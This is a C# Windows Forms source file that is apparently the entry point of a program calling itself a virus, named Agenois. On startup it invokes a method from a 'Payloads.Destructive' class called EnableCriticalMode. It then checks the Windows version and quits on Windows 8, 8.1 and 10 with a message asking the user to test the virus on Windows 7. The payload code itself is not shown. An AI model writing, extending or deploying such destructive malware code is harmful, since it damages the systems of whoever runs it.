using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Agenois
{
    public partial class MainThread : Form
    {
        public MainThread()
        {
            InitializeComponent();
        }

        private void MainThread_Load(object sender, EventArgs e)
        {
            //Everything on startup.
            Payloads.Destructive.EnableCriticalMode();

            OperatingSystem os = Environment.OSVersion;
            Version vs = os.Version;
            string operatingSystem = "";
            if (os.Platform == PlatformID.Win32NT)
            {
                switch (vs.Major)
                {
                    case 6:
                        if (vs.Minor == 2)
                            operatingSystem = "8";
                        else if (vs.Minor == 3)
                            operatingSystem = "8.1";
                        break;
                    case 10:
                        operatingSystem = "10";
                        break;
                    default:
                        break;
                }
            }
            if (operatingSystem == "10")
            {
                MessageBox.Show("This virus doesn't work on Windows 10" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (operatingSystem == "8")
            {
                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (operatingSystem == "8.1")
            {
                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
        }
    }
}
